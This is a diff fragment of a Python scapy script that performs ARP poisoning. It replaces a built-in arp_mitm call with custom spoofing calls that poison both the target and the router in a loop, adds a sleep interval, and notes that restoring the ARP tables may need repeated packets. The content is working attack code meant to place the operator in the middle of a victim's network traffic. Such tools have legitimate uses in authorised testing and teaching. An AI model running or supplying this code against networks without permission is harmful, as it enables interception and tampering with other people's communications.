@@ -11,7 +11,7 @@ def restore_defaults(dest, source):
     target_mac = get_mac(dest)
     source_mac = get_mac(source)
     packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=False) # if its not restoring add count=4
 
 
 def spoofing(target, spoofed):
@@ -25,11 +25,11 @@ def arp_poisoning_loop(interface_to_poison, target_ip, router_ip, printing_queue
     print(f"Starting spoofing: {target_ip} <- {router_ip}")
     while not cancel_token.is_set():
         try:
-            arp_mitm(router_ip, target_ip, iface=interface_to_poison)
-            # spoofing(target_device["ip"], router_ip)
-            # spoofing(router_ip, target_device["ip"])
+            # arp_mitm(router_ip, target_ip, iface=interface_to_poison)
+            spoofing(target_ip, router_ip)
+            spoofing(router_ip, target_ip)
 
-            print("\n[!] Arp poisoning thread is exiting. Restoring default ARP settings...")
+            time.sleep(2)
             # restore_defaults(target_device["ip"], router_ip)
             # restore_defaults(router_ip, target_device["ip"])
             # print("Default settings restored. Exiting.")
@@ -39,6 +39,9 @@ def arp_poisoning_loop(interface_to_poison, target_ip, router_ip, printing_queue
             continue
         except Exception as e:
             print(f"[ERROR] {e}")
+
+    print("\n[!] Arp poisoning thread is exiting. Restoring default ARP settings...")
+
 
 def start_arp_poisoning(interface_to_poison, target_ip, router_ip, printing_queue, verbosity):
     cancel_token = threading.Event()
